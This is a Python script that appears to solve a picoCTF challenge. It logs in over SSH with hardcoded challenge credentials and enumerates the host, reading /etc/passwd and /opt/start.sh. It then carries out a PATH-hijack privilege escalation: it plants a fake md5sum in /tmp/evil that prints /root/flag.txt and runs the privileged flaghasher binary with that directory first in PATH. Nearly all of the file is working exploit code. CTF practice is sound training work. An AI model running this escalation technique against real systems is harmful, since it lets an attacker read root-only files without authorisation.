#!/usr/bin/env python3
import paramiko, sys, io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

HOST = "rescued-float.picoctf.net"
PORT = 60715
USER = "ctf-player"
PASS = "a630e1f8"

def run(client, cmd, timeout=10, get_pty=True):
    print(f"\n$ {cmd}")
    stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout, get_pty=get_pty)
    out = stdout.read().decode(errors="replace")
    err = stderr.read().decode(errors="replace")
    if out: sys.stdout.write(out)
    if err: sys.stdout.write("[stderr] " + err)
    return out, err

c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect(HOST, PORT, USER, PASS, timeout=15)
print(f"[OK] Connected as {USER}@{HOST}:{PORT}")

# Check what tools are available
run(c, "bash -c 'which strace ltrace gdb md5sum cat head find 2>&1'")
run(c, "bash -c 'ls -la /usr/local/bin /opt /challenge 2>&1'")
run(c, "bash -c 'cat /opt/start.sh 2>&1'")

# The start.sh might tell us the setup
run(c, "bash -c 'ls -la /root/ 2>&1'")
run(c, "bash -c 'cat /etc/passwd | head -20'")
run(c, "bash -c 'uname -a; cat /etc/os-release | head -10'")

# Try classic hash-only-1 exploit: PATH hijack via /tmp/md5sum
# Our fake md5sum reads /root/flag.txt
run(c, "bash -c 'mkdir -p /tmp/evil; cat > /tmp/evil/md5sum << EOF\n#!/bin/sh\ncat /root/flag.txt\nexit 0\nEOF\nchmod +x /tmp/evil/md5sum\nls -la /tmp/evil/'")

# Run flaghasher with our PATH first
run(c, "bash -c 'PATH=/tmp/evil:$PATH /usr/local/bin/flaghasher 2>&1'")
run(c, "bash -c 'cd /tmp/evil && /usr/local/bin/flaghasher 2>&1'")
run(c, "bash -c 'env -i PATH=/tmp/evil:/usr/bin:/bin /usr/local/bin/flaghasher 2>&1'")

c.close()
